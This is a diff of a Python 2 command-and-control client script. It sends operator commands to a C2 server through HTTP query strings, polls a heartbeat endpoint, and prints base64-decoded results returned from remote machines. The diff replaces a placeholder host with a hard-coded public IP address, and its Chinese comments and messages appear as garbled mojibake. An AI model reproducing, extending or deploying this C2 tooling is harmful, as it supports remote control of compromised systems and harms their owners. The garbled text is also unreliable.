@@ -11,7 +11,7 @@ import base64
 def send(c2cmd):
 	url="http://ip:5000/c2server?cmd="+c2cmd
 	#print url
-	# ·¢ËÍÃüÁî
+	# å‘é€å‘½ä»¤
 	i=1
 	try:
 		while i<10:
@@ -19,7 +19,6 @@ def send(c2cmd):
 			s1= requests.get(url, timeout=10)
 			#print s1.status_code
 			if s1.status_code == 200:
-				#ÕıÔòÆ¥ÅäÄÚÈİ
 				com= s1.content
 				#print command
 				if com == 'ok':
@@ -31,34 +30,34 @@ def send(c2cmd):
 def heartbeats():
 	i=0
 	j=0
-	url0="http://ip:5000/c2heartbeat?control=test"
-	try:
-		while True:
-			j+=1
+	url0="http://49.234.9.94:5000/c2heartbeat?control=test"
+	while True:
+		j+=1
+		try:
 			s0= requests.get(url0, timeout=5)
 			if s0.status_code == 200:
 				c1=s0.content
 				break
-			if j>40:
-				print '\nÊ§È¥Á¬½Ó'
-				j=0
-			time.sleep(1)
-	except:
-		pass
-	print 'ÒÑÁ¬½Ó'
+		except:
+			pass
+		if j>40:
+			print '\nå¤±å»è¿æ¥'
+			j=0
+		time.sleep(1)
+	print 'å·²è¿æ¥'
 	t1 = threading.Thread(target=main)
 	t1.start()
 	while True:
 		i+=1
 		if i>5:
-			print 'Ê§È¥Á¬½Ó'
-		# Ã¿10Ãë½ÓÊÕÒ»´ÎĞÄÌø°ü
+			print 'å¤±å»è¿æ¥'
+		# æ¯10ç§’æ¥æ”¶ä¸€æ¬¡å¿ƒè·³åŒ…
 		try:
 			s0= requests.get(url0, timeout=5)
 			if s0.status_code == 200:
 				c2=s0.content
 			if c2!=c1:
-				print 'ÒÑÁ¬½Ó\nCommand:'
+				print 'å·²è¿æ¥\nCommand:'
 				c1=c2
 				c2=''
 				i=0
@@ -69,14 +68,13 @@ def heartbeats():
 
 def receive():
 	url="http://ip:5000/c2server?results=test"
-	# ÃüÁîÖ´ĞĞ½áÊøµÄ»ØÏÔ·¢ËÍ
+	# å‘½ä»¤æ‰§è¡Œç»“æŸçš„å›æ˜¾å‘é€
 	i=1
 	try:
 		while i<10:
 			i=i+1
 			s1= requests.get(url,timeout=30)
 			if s1.status_code == 200:
-				#ÕıÔòÆ¥ÅäÄÚÈİ
 				results= s1.content
 				print base64.b64decode(results)
 				return
@@ -98,6 +96,6 @@ def main():
 
 
 if __name__ == '__main__':
-	#Æô¶¯ĞÄÌøÏß³Ì
+	#å¯åŠ¨å¿ƒè·³çº¿ç¨‹
 	t = threading.Thread(target=heartbeats)
 	t.start()
